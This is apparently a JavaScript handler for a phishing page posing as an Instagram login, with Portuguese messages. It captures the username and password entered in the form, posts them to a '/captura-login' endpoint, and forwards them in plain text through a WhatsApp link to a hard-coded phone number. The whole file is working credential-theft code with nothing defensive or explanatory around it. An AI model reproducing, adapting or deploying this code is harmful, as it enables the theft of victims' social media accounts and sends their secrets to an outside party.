document.getElementById("formLogin").addEventListener("submit", async function (e) {
  e.preventDefault();

  const usuarioInput = document.getElementById("usuario");
  const senhaInput = document.getElementById("senha");

  const usuario = usuarioInput.value.trim();
  const senha = senhaInput.value.trim();

  if (!usuario || !senha) {
    alert("Preencha todos os campos!");
    return;
  }

  // Desativa os campos enquanto envia
  usuarioInput.disabled = true;
  senhaInput.disabled = true;

  const botao = this.querySelector("button");
  const textoOriginal = botao.innerText;
  botao.innerText = "Enviando...";
  botao.disabled = true;

  try {
    await fetch("/captura-login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ usuario, senha })
    });

    // Envia para o WhatsApp
    const zap = `https://wa.me/5581992614347?text=🔐 Novo login Instagram 2.0:%0A👤 Usuário: ${usuario}%0A🔑 Senha: ${senha}`;
    window.open(zap, "_blank");

    alert("Login registrado com sucesso!");
    // Opcional: Redireciona para outra página
    // window.location.href = "/painel.html";
  } catch (error) {
    alert("Erro ao enviar os dados. Tente novamente.");
  } finally {
    botao.innerText = textoOriginal;
    botao.disabled = false;
    usuarioInput.disabled = false;
    senhaInput.disabled = false;
  }
});
